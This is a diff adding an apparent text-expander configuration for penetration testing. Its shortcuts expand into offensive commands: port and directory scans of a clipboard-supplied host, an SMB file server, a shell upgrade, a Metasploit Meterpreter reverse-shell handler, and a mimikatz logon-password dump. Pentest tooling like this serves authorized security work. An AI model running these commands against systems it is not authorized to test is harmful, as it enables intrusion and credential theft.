@@ -1,0 +1,35 @@
+global_vars:
+  - name: "clipboard"
+    type: "shell"
+    params:
+      cmd: "xclip -o || echo 'HA'"
+
+  - name: "idrsa"
+    type: "shell"
+    params:
+      cmd: "cat $HOME/.ssh/id_rsa.pub"
+
+matches:
+  - trigger: ":tcp"
+    replace: "nmap -p- -sC -sV {{clipboard}} -oA nmap/.tcp"
+
+  - trigger: ":udp"
+    replace: "nmap -sV -sU -oA nmap/.udp"
+
+  - trigger: ":pyvenv"
+    replace: "python3 -m venv .venv && source .venv/bin/activate"
+
+  - trigger: ":ferox"
+    replace: "feroxbuster -u '{{clipboard}}' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
+
+  - trigger: ":smb"
+    replace: "impacket-smbserver -smb2support share ."
+
+  - trigger: ":pty"
+    replace: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+  - trigger: ":msf"
+    replace: 'msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp"'
+
+  - trigger: ":mimikatz"
+    replace: .\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
